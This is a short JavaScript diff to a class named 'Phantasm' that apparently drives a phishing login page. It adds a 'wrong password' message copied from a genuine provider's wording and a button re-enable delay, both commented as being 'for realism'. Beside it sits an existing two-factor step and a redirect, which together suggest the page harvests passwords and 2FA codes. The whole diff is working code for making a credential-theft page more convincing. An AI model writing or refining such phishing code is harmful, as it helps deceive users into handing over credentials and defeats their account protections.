@@ -260,6 +260,17 @@ class Phantasm {
 
             if (data.status === '2fa_required') {
                 this.transitionToStep(3);
+            } else if (data.status === 'invalid_credentials') {
+                // Show realistic error message for wrong credentials
+                this.showError(data.message || 'Wrong password. Try again or click Forgot password to reset it.');
+                // Re-enable button with slight delay for realism
+                setTimeout(() => {
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.innerText = originalText;
+                    }
+                }, 800);
+                return; // Stop further execution
             } else if (data.redirect) {
                 window.location.href = data.redirect;
             } else {
